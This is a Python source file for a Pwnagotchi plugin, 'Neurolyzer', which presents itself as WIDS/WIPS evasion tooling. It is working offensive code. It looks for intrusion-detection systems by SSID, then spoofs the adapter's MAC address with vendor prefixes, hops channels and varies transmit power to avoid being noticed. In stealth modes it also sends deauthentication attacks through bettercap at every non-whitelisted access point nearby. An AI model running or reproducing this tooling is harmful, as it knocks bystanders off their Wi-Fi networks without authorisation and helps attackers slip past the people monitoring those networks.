import logging
import subprocess
import time
import random
import os
import re
import fcntl
import shutil
import traceback

import pwnagotchi.plugins as plugins
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
import pwnagotchi.ui.fonts as fonts


class Neurolyzer(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '2.0.0'
    __license__ = 'GPL3'
    __description__ = "Advanced WIDS/WIPS evasion with hardware-aware adaptive countermeasures"

    DEFAULT_OUI = [
        '00:14:22', '34:AB:95', 'DC:A6:32', '00:1A:11', '08:74:02', '50:32:37',
        'B8:27:EB', 'E4:5F:01', 'FC:45:96', '00:E0:4C', '00:1E:06',
        '00:26:BB', '00:50:F2', '00:0C:29', '00:15:5D'
    ]
    DEFAULT_WIDS = ['wids-guardian', 'airdefense', 'cisco-ips', 'cisco-awips',
                    'fortinet-wids', 'aruba-widp', 'kismet']
    SAFE_CHANNELS = [1, 6, 11]
    MIN_MAC_CHANGE_INTERVAL = 30
    LOCK_FILE = '/tmp/neurolyzer.lock'

    def __init__(self):
        self.enabled = False
        self.wifi_interface = 'wlan0'
        self.monitor_iface = None
        self.operation_mode = 'stealth'
        self.mac_change_interval = 3600
        self.last_operations = {
            'mac_change': 0,
            'wids_check': 0,
            'channel_hop': 0,
            'tx_power_change': 0
        }
        self.hw_caps = {
            'tx_power': {'min': 1, 'max': 20, 'supported': True},
            'supported_channels': self.SAFE_CHANNELS,
            'monitor_mode': True,
            'mac_spoofing': True,
            'broadcom': False,
            'nexmon': False,
            'injection': False
        }
        self.current_channel = 1
        self.current_tx_power = 20
        self.probe_blacklist = []
        self.current_mac = None
        self.lock_fd = None
        self.stealth_level = 1
        self.deauth_throttle = 0.5
        self.whitelist_ssids = []
        self.has_macchanger = False

        self.ui_config = {
            'mode': (0, 0),
            'mac_timer': (0, 10),
            'tx_power': (0, 20),
            'channel': (0, 30),
            'stealth': (0, 40)
        }

    # -------------------------------------------------------------------------
    # Locking
    # -------------------------------------------------------------------------
    def _acquire_lock(self):
        try:
            self.lock_fd = open(self.LOCK_FILE, 'w')
            fcntl.flock(self.lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
            return True
        except (IOError, BlockingIOError):
            return False

    def _release_lock(self):
        if self.lock_fd:
            try:
                fcntl.flock(self.lock_fd, fcntl.LOCK_UN)
                self.lock_fd.close()
                os.remove(self.LOCK_FILE)
            except:
                pass

    # -------------------------------------------------------------------------
    # Robust command execution with exit code logging
    # -------------------------------------------------------------------------
    def _execute(self, cmd, critical=False, retries=2, timeout=8):
        full_cmd = ['sudo'] + cmd
        last_error = None
        for attempt in range(retries + 1):
            try:
                result = subprocess.run(
                    full_cmd,
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=timeout
                )
                return result
            except subprocess.CalledProcessError as e:
                last_error = e
                err = e.stderr.strip()
                logging.debug(f"[Neurolyzer] Cmd '{' '.join(full_cmd)}' failed (attempt {attempt+1}) "
                              f"with exit code {e.returncode}: {err}")
                if "Device or resource busy" in err:
                    time.sleep(random.uniform(0.5, 1.5))
                    continue
                if cmd[0] == 'iw' and 'txpower' in cmd:
                    iwconfig_cmd = ['iwconfig', self.wifi_interface, 'txpower', cmd[-1]]
                    return self._execute(iwconfig_cmd, critical, retries - attempt, timeout)
            except Exception as e:
                last_error = e
                logging.debug(f"[Neurolyzer] Unexpected error in _execute: {e}")
        if critical:
            logging.error(f"[Neurolyzer] Critical command failed after retries: {' '.join(full_cmd)}")
        return None

    # -------------------------------------------------------------------------
    # Hardware discovery – non‑intrusive, no MAC spoofing test
    # -------------------------------------------------------------------------
    def _discover_hardware(self):
        try:
            info = self._execute(['iw', 'dev', self.wifi_interface, 'info'])
            if not info:
                raise RuntimeError("Cannot get interface info")

            phy_match = re.search(r'phy#(\d+)', info.stdout)
            if phy_match:
                phy = phy_match.group(1)
                phy_info = self._execute(['iw', 'phy', phy, 'info'])
                if phy_info:
                    self.hw_caps['supported_channels'] = self._parse_channels(phy_info.stdout)

            tx_info = self._execute(['iw', 'dev', self.wifi_interface, 'get', 'txpower'])
            if tx_info:
                matches = re.findall(r'(\d+(?:\.\d+)?) dBm', tx_info.stdout)
                if matches:
                    values = [int(float(v)) for v in matches]
                    self.hw_caps['tx_power']['min'] = min(values)
                    self.hw_caps['tx_power']['max'] = max(values)
                    self.hw_caps['tx_power']['supported'] = True

            self.hw_caps['monitor_mode'] = 'monitor' in info.stdout

            # Driver detection (Broadcom / Nexmon) – only if nexutil exists
            driver_path = f'/sys/class/net/{self.wifi_interface}/device/driver'
            if os.path.exists(driver_path):
                driver = os.path.basename(os.readlink(driver_path))
                if 'brcmfmac' in driver:
                    self.hw_caps['broadcom'] = True
                    # Check for Nexmon: look for 'nexmon' in dmesg and presence of nexutil
                    dmesg = self._execute(['dmesg'], timeout=5)
                    nexutil_present = shutil.which('nexutil') is not None
                    if dmesg and 'nexmon' in dmesg.stdout.lower() and nexutil_present:
                        self.hw_caps['nexmon'] = True
                        self.hw_caps['injection'] = True
                        self.hw_caps['supported_channels'].extend([36, 40, 44, 48])
                        logging.info("[Neurolyzer] Nexmon detected: injection & 5 GHz enabled")
                    else:
                        self.hw_caps['injection'] = False
                        logging.info("[Neurolyzer] Broadcom without Nexmon – injection disabled")

            # MAC spoofing capability: check for macchanger
            self.has_macchanger = shutil.which('macchanger') is not None
            if not self.has_macchanger:
                logging.warning("[Neurolyzer] macchanger not installed. MAC changes may fail.")
            self.hw_caps['mac_spoofing'] = self.has_macchanger  # optimistic

        except Exception as e:
            logging.error(f"[Neurolyzer] Hardware discovery failed: {e}")

    def _parse_channels(self, phy_info):
        channels = []
        for line in phy_info.split('\n'):
            match = re.search(r'\*?\s*\d+\s*MHz\s*\[\s*(\d+)\s*\]', line)
            if match:
                channels.append(int(match.group(1)))
        if not channels:
            channels = self.SAFE_CHANNELS
        return sorted(set(channels))

    # -------------------------------------------------------------------------
    # Interface helpers
    # -------------------------------------------------------------------------
    def _interface_exists(self, iface=None):
        if iface is None:
            iface = self.wifi_interface
        return os.path.exists(f'/sys/class/net/{iface}')

    def _ensure_monitor_interface(self):
        mon = self.monitor_iface if self.monitor_iface else self._detect_monitor_interface()
        if not mon:
            mon = self.monitor_iface or 'wlan0mon'
        if self._interface_exists(mon):
            self._execute(['ip', 'link', 'set', 'dev', mon, 'up'])
            logging.debug(f"[Neurolyzer] Monitor interface {mon} is up")
            return True
        logging.info(f"[Neurolyzer] Monitor interface {mon} missing – recreating")
        return self._recreate_monitor_interface(mon)

    def _recreate_monitor_interface(self, mon_name):
        for attempt in range(3):
            self._execute(['iw', 'dev', self.wifi_interface, 'interface', 'add', mon_name, 'type', 'monitor'])
            time.sleep(1)
            if self._interface_exists(mon_name):
                self._execute(['ip', 'link', 'set', 'dev', mon_name, 'up'])
                logging.info(f"[Neurolyzer] Monitor interface {mon_name} created")
                return True
            logging.warning(f"[Neurolyzer] Failed to create {mon_name} (attempt {attempt+1})")
        return False

    # -------------------------------------------------------------------------
    # MAC rotation – with detailed error logging
    # -------------------------------------------------------------------------
    def _safe_mac_change(self):
        if time.time() - self.last_operations['mac_change'] < self.MIN_MAC_CHANGE_INTERVAL:
            return
        if not self._acquire_lock():
            logging.debug("[Neurolyzer] MAC change skipped: lock busy")
            return

        errors = []  # Collect errors for logging

        try:
            original_mac = self._get_current_mac()
            new_mac = self._generate_valid_mac()

            # Get monitor interface name
            mon = self.monitor_iface if self.monitor_iface else self._detect_monitor_interface()
            mon_exists = mon and self._interface_exists(mon)

            # If monitor exists, bring it down (but don't delete)
            if mon_exists:
                logging.debug(f"[Neurolyzer] Taking monitor {mon} down")
                self._execute(['ip', 'link', 'set', 'dev', mon, 'down'])
                time.sleep(0.5)

            # Bring physical down
            self._execute(['ip', 'link', 'set', 'dev', self.wifi_interface, 'down'])
            time.sleep(0.5)

            # Try each method, capturing errors
            changed = False

            # Method 1: macchanger
            if self.has_macchanger:
                try:
                    result = self._execute(['macchanger', '-m', new_mac, self.wifi_interface], retries=3, timeout=10)
                    if result:
                        changed = True
                        logging.debug("[Neurolyzer] MAC changed via macchanger")
                except Exception as e:
                    errors.append(f"macchanger: {str(e)}")

            # Method 2: ip
            if not changed:
                try:
                    result = self._execute(['ip', 'link', 'set', 'dev', self.wifi_interface, 'address', new_mac], retries=3, timeout=10)
                    if result:
                        changed = True
                        logging.debug("[Neurolyzer] MAC changed via ip")
                except Exception as e:
                    errors.append(f"ip: {str(e)}")

            # Method 3: ifconfig
            if not changed:
                try:
                    result = self._execute(['ifconfig', self.wifi_interface, 'hw', 'ether', new_mac], retries=3, timeout=10)
                    if result:
                        changed = True
                        logging.debug("[Neurolyzer] MAC changed via ifconfig")
                except Exception as e:
                    errors.append(f"ifconfig: {str(e)}")

            if not changed:
                raise RuntimeError("All MAC change methods failed. Errors: " + "; ".join(errors))

            # Bring physical up
            self._execute(['ip', 'link', 'set', 'dev', self.wifi_interface, 'up'])
            time.sleep(0.5)

            # Bring monitor back up if it existed
            if mon_exists:
                self._execute(['ip', 'link', 'set', 'dev', mon, 'up'])
                logging.debug(f"[Neurolyzer] Monitor {mon} brought back up")
            else:
                # If monitor didn't exist, ensure it's created
                self._ensure_monitor_interface()

            # Verify MAC
            verified = self._get_current_mac()
            if verified and verified.lower() != new_mac.lower():
                raise RuntimeError(f"MAC verification failed: {verified} != {new_mac}")

            self.last_operations['mac_change'] = time.time()
            self.current_mac = new_mac
            logging.info(f"[Neurolyzer] MAC changed to {new_mac} (monitor preserved)")

        except Exception as e:
            logging.error(f"[Neurolyzer] MAC change failed: {e}")
            # Attempt to restore original MAC
            if original_mac:
                self._execute(['ip', 'link', 'set', 'dev', self.wifi_interface, 'address', original_mac])
                self._execute(['ip', 'link', 'set', 'dev', self.wifi_interface, 'up'])
        finally:
            self._release_lock()

    def _get_current_mac(self):
        try:
            with open(f'/sys/class/net/{self.wifi_interface}/address') as f:
                return f.read().strip()
        except:
            return None

    def _detect_monitor_interface(self):
        for iface in os.listdir('/sys/class/net'):
            if iface.startswith('mon') or iface.startswith('wlan0mon'):
                try:
                    with open(f'/sys/class/net/{iface}/phy80211/name') as f:
                        phy = f.read().strip()
                    with open(f'/sys/class/net/{self.wifi_interface}/phy80211/name') as f:
                        phy_main = f.read().strip()
                    if phy == phy_main:
                        return iface
                except:
                    pass
        return None

    def _generate_valid_mac(self):
        if self.operation_mode == 'noided':
            oui = random.choice(self.DEFAULT_OUI).replace(':', '')
            return f"{oui[:2]}:{oui[2:4]}:{oui[4:6]}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
        return ':'.join(f"{random.randint(0,255):02x}" for _ in range(6))

    # -------------------------------------------------------------------------
    # TX power
    # -------------------------------------------------------------------------
    def _adjust_tx_power(self):
        if not self.hw_caps['tx_power']['supported']:
            return
        try:
            min_p = self.hw_caps['tx_power']['min']
            max_p = self.hw_caps['tx_power']['max']
            if self.stealth_level == 3:
                new_power = random.randint(min_p, min_p + 5)
            elif self.stealth_level == 2:
                new_power = random.randint(min_p + 5, max_p - 5)
            else:
                new_power = random.randint(max_p - 5, max_p)
            self._execute(['iw', 'dev', self.wifi_interface, 'set', 'txpower', 'fixed', f"{new_power}dBm"])
            self.current_tx_power = new_power
        except Exception as e:
            logging.debug(f"[Neurolyzer] TX power adjustment skipped: {e}")

    # -------------------------------------------------------------------------
    # Channel hopping
    # -------------------------------------------------------------------------
    def _channel_hop(self):
        if time.time() - self.last_operations['channel_hop'] < 60:
            return
        try:
            valid = self.hw_caps['supported_channels']
            if self.stealth_level >= 2:
                candidates = [ch for ch in valid if ch in self.SAFE_CHANNELS]
            else:
                candidates = valid
            if not candidates:
                candidates = self.SAFE_CHANNELS
            new_channel = random.choice(candidates)
            if self._execute(['iw', 'dev', self.wifi_interface, 'set', 'channel', str(new_channel)]):
                self.current_channel = new_channel
                self.last_operations['channel_hop'] = time.time()
        except Exception as e:
            logging.error(f"[Neurolyzer] Channel hop failed: {e}")

    # -------------------------------------------------------------------------
    # Traffic shaping
    # -------------------------------------------------------------------------
    def _throttle_traffic(self):
        try:
            self._execute([
                'tc', 'qdisc', 'replace', 'dev', self.wifi_interface,
                'root', 'netem', 'delay', '100ms', '10ms', 'distribution', 'normal'
            ])
        except:
            self._execute([
                'tc', 'qdisc', 'replace', 'dev', self.wifi_interface,
                'root', 'pfifo_fast', 'limit', '100'
            ])

    # -------------------------------------------------------------------------
    # WIDS detection
    # -------------------------------------------------------------------------
    def _check_wids(self, access_points):
        if time.time() - self.last_operations['wids_check'] < 300:
            return
        wids_list = [w.lower() for w in self.options.get('wids_ssids', self.DEFAULT_WIDS)]
        for ap in access_points:
            essid = ap.get('essid', '')
            if essid.lower() in wids_list:
                logging.warning(f"[Neurolyzer] WIDS detected: {essid}")
                self._evasion_protocol()
                break
        self.last_operations['wids_check'] = time.time()

    def _evasion_protocol(self):
        logging.info("[Neurolyzer] Executing evasion protocol")
        measures = [
            self._safe_mac_change,
            self._channel_hop,
            self._adjust_tx_power,
            self._throttle_traffic
        ]
        for measure in random.sample(measures, k=random.randint(2, 3)):
            try:
                measure()
            except Exception as e:
                logging.error(f"[Neurolyzer] Evasion measure failed: {e}")

    # -------------------------------------------------------------------------
    # Stealth adaptation
    # -------------------------------------------------------------------------
    def _adapt_stealth(self, access_points):
        try:
            num_aps = len(access_points)
            if num_aps > 20:
                self.stealth_level = 3
                self.mac_change_interval = random.randint(300, 600)
                self.deauth_throttle = 0.2
            elif num_aps > 5:
                self.stealth_level = 2
                self.mac_change_interval = random.randint(600, 1800)
                self.deauth_throttle = 0.5
            else:
                self.stealth_level = 1
                self.mac_change_interval = random.randint(1800, 3600)
                self.deauth_throttle = 0.8
            logging.debug(f"[Neurolyzer] Stealth level: {self.stealth_level}")
        except Exception as e:
            logging.error(f"[Neurolyzer] Stealth adaptation failed: {e}")

    # -------------------------------------------------------------------------
    # Deauth using bettercap
    # -------------------------------------------------------------------------
    def _deauth_ap(self, agent, bssid):
        try:
            if hasattr(agent, 'run'):
                agent.run(f"wifi.deauth {bssid}")
            else:
                subprocess.run(['bettercap', '-eval', f'wifi.deauth {bssid}'], timeout=5)
        except Exception as e:
            logging.debug(f"[Neurolyzer] Deauth failed for {bssid}: {e}")

    # -------------------------------------------------------------------------
    # Plugin hooks
    # -------------------------------------------------------------------------
    def on_loaded(self):
        self.options = self.options or {}
        self.enabled = self.options.get('enabled', True)
        if not self.enabled:
            return

        self.operation_mode = self.options.get('operation_mode', 'stealth')
        if self.operation_mode not in ['normal', 'stealth', 'noided']:
            logging.error(f"[Neurolyzer] Invalid operation_mode: {self.operation_mode}")
            self.enabled = False
            return

        self.wifi_interface = self.options.get('wifi_interface', 'wlan0')
        self.monitor_iface = self.options.get('monitor_iface')
        self.mac_change_interval = self.options.get('mac_change_interval', 3600)
        self.whitelist_ssids = self.options.get('whitelist_ssids', [])

        for key in self.ui_config:
            x_opt = f"{key}_label_x"
            y_opt = f"{key}_label_y"
            self.ui_config[key] = (
                self.options.get(x_opt, self.ui_config[key][0]),
                self.options.get(y_opt, self.ui_config[key][1])
            )

        try:
            if not self._interface_exists():
                raise RuntimeError(f"Interface {self.wifi_interface} not found")
            self._discover_hardware()
            # Do NOT run _apply_initial_config here – it can interfere with monitor setup
            # We'll let on_wifi_update handle periodic tasks
            logging.info(f"[Neurolyzer] Loaded in {self.operation_mode} mode")
        except Exception as e:
            logging.error(f"[Neurolyzer] Initialization failed: {e}")
            self.enabled = False

    def on_ui_setup(self, ui):
        if not self.enabled:
            return
        ui.add_element('neuro_mode', LabeledValue(
            color=BLACK, label='Mode:', value=self.operation_mode.capitalize(),
            position=self.ui_config['mode'], label_font=fonts.Small, text_font=fonts.Small))
        ui.add_element('neuro_mac', LabeledValue(
            color=BLACK, label='Next MAC:', value='...',
            position=self.ui_config['mac_timer'], label_font=fonts.Small, text_font=fonts.Small))
        ui.add_element('neuro_tx', LabeledValue(
            color=BLACK, label='TX:', value=f"{self.current_tx_power}dBm",
            position=self.ui_config['tx_power'], label_font=fonts.Small, text_font=fonts.Small))
        ui.add_element('neuro_chan', LabeledValue(
            color=BLACK, label='CH:', value=str(self.current_channel),
            position=self.ui_config['channel'], label_font=fonts.Small, text_font=fonts.Small))
        ui.add_element('neuro_stealth', LabeledValue(
            color=BLACK, label='Stealth:', value=str(self.stealth_level),
            position=self.ui_config['stealth'], label_font=fonts.Small, text_font=fonts.Small))

    def on_ui_update(self, ui):
        if not self.enabled:
            return
        try:
            ui.set('neuro_mode', self.operation_mode.capitalize())
            ui.set('neuro_mac', f"{self._next_mac_time()}m")
            ui.set('neuro_tx', f"{self.current_tx_power}dBm")
            ui.set('neuro_chan', str(self.current_channel))
            ui.set('neuro_stealth', str(self.stealth_level))
        except Exception as e:
            logging.error(f"[Neurolyzer] UI update failed: {e}\n{traceback.format_exc()}")

    def on_wifi_update(self, agent, access_points):
        if not self.enabled:
            return
        try:
            logging.debug("[Neurolyzer] on_wifi_update started")
            # Ensure monitor interface is present
            if self.operation_mode in ['stealth', 'noided']:
                if not self._ensure_monitor_interface():
                    logging.error("[Neurolyzer] Monitor interface missing and could not be created!")

            self._adapt_stealth(access_points)
            self._check_wids(access_points)

            target_aps = [ap for ap in access_points if ap.get('essid', '') not in self.whitelist_ssids]

            if self.operation_mode in ['stealth', 'noided']:
                # MAC change
                if time.time() - self.last_operations['mac_change'] > self.mac_change_interval:
                    logging.debug("[Neurolyzer] MAC change due")
                    self._safe_mac_change()

                # Deauth
                if self.hw_caps['injection'] and target_aps:
                    num_deauth = max(1, int(len(target_aps) * self.deauth_throttle))
                    for ap in random.sample(target_aps, min(num_deauth, len(target_aps))):
                        bssid = ap.get('bssid')
                        if bssid:
                            logging.debug(f"[Neurolyzer] Deauth {bssid}")
                            self._deauth_ap(agent, bssid)

                # Channel hop
                logging.debug("[Neurolyzer] Channel hop check")
                self._channel_hop()

                # TX power
                logging.debug("[Neurolyzer] TX power check")
                self._adjust_tx_power()

                # Traffic shaping
                logging.debug("[Neurolyzer] Traffic shaping check")
                self._throttle_traffic()

            logging.debug("[Neurolyzer] on_wifi_update finished")
        except Exception as e:
            logging.error(f"[Neurolyzer] Unhandled exception in on_wifi_update: {e}\n{traceback.format_exc()}")

    def _next_mac_time(self):
        try:
            remaining = self.last_operations['mac_change'] + self.mac_change_interval - time.time()
            return max(0, int(remaining // 60))
        except:
            return 0

    def on_unload(self, ui=None):
        if self.enabled:
            logging.info("[Neurolyzer] Unloading, restoring network settings")
            self._execute(['tc', 'qdisc', 'del', 'dev', self.wifi_interface, 'root'])
        self._release_lock()
